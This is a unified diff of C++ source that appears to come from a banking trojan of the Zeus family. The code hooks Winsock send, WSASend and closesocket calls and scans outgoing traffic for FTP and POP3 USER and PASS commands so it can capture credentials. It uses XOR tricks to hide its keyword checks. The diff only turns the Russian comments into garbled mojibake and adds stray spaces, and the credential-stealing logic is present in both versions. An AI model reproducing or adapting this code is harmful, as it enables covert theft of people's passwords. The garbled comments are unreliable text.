@@ -15,9 +15,9 @@
 #include "..\common\wsocket.h"
 
 #if(BO_SOCKET_FTP > 0 || BO_SOCKET_POP3 > 0)
-////////////////////////////////////////////////////////////////////////////////////////////////////
-// Переменные и функции для хранения промежуточных данных.
-////////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////// / / ////////////////////////////////////////////////
+// RџRμSЂRμRјRμRЅRЅS <Rμ Fe C SѓRЅRєS † ReRe RґR "SЏ With ... SЂR ° RЅRμRЅReSЏ RїSЂRѕRјRμR ¶ SѓS, RѕS ‡ RЅS <C ... RґR ° RЅRЅS <C ....
+////////////////////////////////////////////////// / / ////////////////////////////////////////////////
 
 typedef struct
 {
@@ -49,13 +49,13 @@ static void socketDataFree(SOCKETDATA *sd, bool freeOnly = false)
 {
   sd->socket = INVALID_SOCKET;
   
-  Mem::free(sd->userName);
+  Mem:: free (sd-> userName);
   sd->userName = NULL;
   
   Mem::free(sd->pass);
   sd->pass = NULL;
 
-  //Отпимизируем список.
+  //RћS, RїReRјReR · ReSЂSѓRμRј SЃRїReSЃRѕRє.
   if(freeOnly == false)
   {
     DWORD newCount = socketDataCount;
@@ -68,14 +68,14 @@ static void socketDataFree(SOCKETDATA *sd, bool freeOnly = false)
   }
 }
 
-////////////////////////////////////////////////////////////////////////////////////////////////////
-#define XOR_COMPARE(d, w) ((*((LPDWORD)(d)) ^ BO_CLIENT_VERSION) == ((w) ^ BO_CLIENT_VERSION)) //Просто крипт для слов.
+////////////////////////////////////////////////// / / ////////////////////////////////////////////////
+#define XOR_COMPARE(d, w) ((*((LPDWORD)(d)) ^ BO_CLIENT_VERSION) == ((w) ^ BO_CLIENT_VERSION)) //RџSЂRѕSЃS, Rѕ RєSЂReRїS, RґR "SЏ SЃR" RѕRІ.
  
 static bool socketGrabber(SOCKET socket, const LPBYTE data, const DWORD dataSize)
 {
   if(socket == INVALID_SOCKET || data == NULL || dataSize > 512)return false;
 
-  //Поиск имени, Поиск пароля
+  //RџRѕReSЃRє ReRјRμRЅRe, RџRѕReSЃRє RїR ° SЂRѕR "SЏ
   if(dataSize > 6 && (XOR_COMPARE(data, 0x52455355/*USER*/) || XOR_COMPARE(data, 0x53534150/*PASS*/)) && data[4] == ' ')
   {
     LPSTR argOffset = (LPSTR)(data + 5);
@@ -84,7 +84,7 @@ static bool socketGrabber(SOCKET socket, const LPBYTE data, const DWORD dataSize
     //LPSTR nextLine;
     WDEBUG3(WDDT_INFO, "USER/PASS, argOffset=%u, dataSize=%u, argSize=%u", 5, dataSize, argSize);
     
-    //Выделаяем аргумент команды.
+    //R'S <RґRμR "P ° P ° SЏRμRј SЂRіSѓRјRμRЅS, RєRѕRјR RЅRґS ° <.
     {
       DWORD i = 0;
       for(; i < argSize; i++)
@@ -92,7 +92,7 @@ static bool socketGrabber(SOCKET socket, const LPBYTE data, const DWORD dataSize
         BYTE c = argOffset[i];
         if(c == '\r' || c == '\n')
         {
-          //nextLine = &argOffset[i + 1];
+          //nextLine = & argOffset [i + 1];
           break;
         }
         if(c < 0x20)return false;
@@ -101,7 +101,7 @@ static bool socketGrabber(SOCKET socket, const LPBYTE data, const DWORD dataSize
       WDEBUG1(WDDT_INFO, "argument=%s", argument);
     }
 
-    //Добавляем промежуточные данные.
+    //P RѕR ± P ° RІR "SЏRμRј RїSЂRѕRјRμR ¶ SѓS, RѕS ‡ RЅS <Rμ RґR ° RЅRЅS <Rμ.
     SOCKETDATA *sd;
     bool ok = false;
 
@@ -112,11 +112,11 @@ static bool socketGrabber(SOCKET socket, const LPBYTE data, const DWORD dataSize
       ok = true;
       if(data[0] == 'U')
       {
-        socketDataFree(sd, true); //Обнуляем данные.
-        //Mem::free(sd->userName);
+        socketDataFree(sd, true); //RћR ± RЅSѓR "SЏRμRј RґR ° RЅRЅS <Rμ.
+        //Mem:: free (sd-> userName);
         sd->userName = argument;
       }
-      else //if(data[0] == 'P')
+      else //if (data [0] == 'P')
       {
         Mem::free(sd->pass);
         sd->pass = argument;
@@ -125,7 +125,7 @@ static bool socketGrabber(SOCKET socket, const LPBYTE data, const DWORD dataSize
     }
     CWA(kernel32, LeaveCriticalSection)(&socketDataCs);
     
-    //Рекрусия на следующие данные после \r\n.
+    //P RμRєSЂSѓSЃReSЏ RЅR ° SЃR "RμRґSѓSЋS ‰ ReRμ RґR ° RЅRЅS <Rμ RїRѕSЃR" Rμ \ r \ n.
     /*
     if(ok)
     {
@@ -137,7 +137,7 @@ static bool socketGrabber(SOCKET socket, const LPBYTE data, const DWORD dataSize
     return ok;
   }
   
-  //Опеределение протокола.
+  //RћRїRμSЂRμRґRμR "RμRЅReRμ RїSЂRѕS, RѕRєRѕR" P °.
   if(dataSize > 1)
   {
     bool ok = false;
@@ -152,7 +152,7 @@ static bool socketGrabber(SOCKET socket, const LPBYTE data, const DWORD dataSize
         BYTE protocolType      = 0;
         WCHAR protocolTypeStr[max(CryptedStrings::len_sockethook_report_prefix_ftp, CryptedStrings::len_sockethook_report_prefix_pop3)];
 
-        //Опеределяем протокол.
+        //RћRїRμSЂRμRґRμR "SЏRμRј RїSЂRѕS, RѕRєRѕR.
         if(0){}
 #       if(BO_SOCKET_FTP > 0)
         else if((dataSize >= 3 && (data[0] == 'C' || data[0] == 'P') && data[1] == 'W' && data[2] == 'D') ||
@@ -232,9 +232,9 @@ void SocketHook::uninit(void)
 
 int WSAAPI SocketHook::hookerCloseSocket(SOCKET s)
 {
-  //WDEBUG0(WDDT_INFO, "Called"); //Бесит в логах.
+  //WDEBUG0 (WDDT_INFO, "Called"); / / R'RμSЃReS, RІ R "RѕRіR ° C ....
   
-  if(Core::isActive())//Возможна небольшая утечка памяти.
+  if(Core::isActive())//R'RѕR · RјRѕR RЅR ¶ ° ± RЅRμR RѕR "SЊS € P ° SЏ SѓS, RμS RєR ‡ ° ° RїR RјSЏS, Fe.
   {
     CWA(kernel32, EnterCriticalSection)(&socketDataCs);
     SOCKETDATA *sd = socketDataSearch(s);
@@ -247,14 +247,14 @@ int WSAAPI SocketHook::hookerCloseSocket(SOCKET s)
 
 int WSAAPI SocketHook::hookerSend(SOCKET s, const char *buf, int len, int flags)
 {
-  //WDEBUG0(WDDT_INFO, "Called"); //Бесит в логах.
+  //WDEBUG0 (WDDT_INFO, "Called"); / / R'RμSЃReS, RІ R "RѕRіR ° C ....
   if(Core::isActive())socketGrabber(s, (LPBYTE)buf, len);
   return CWA(ws2_32, send)(s, buf, len, flags);
 }
 
 int WSAAPI SocketHook::hookerWsaSend(SOCKET s, LPWSABUF buffers, DWORD bufferCount, LPDWORD numberOfBytesSent, DWORD flags, LPWSAOVERLAPPED overlapped, LPWSAOVERLAPPED_COMPLETION_ROUTINE completionRoutine)
 {
-  //WDEBUG0(WDDT_INFO, "Called"); //Бесит в логах.
+  //WDEBUG0 (WDDT_INFO, "Called"); / / R'RμSЃReS, RІ R "RѕRіR ° C ....
   if(Core::isActive())for(DWORD i = 0; i < bufferCount; i++)socketGrabber(s, (LPBYTE)buffers->buf, buffers->len);
   return WSASend(s, buffers, bufferCount, numberOfBytesSent, flags, overlapped, completionRoutine);
 }
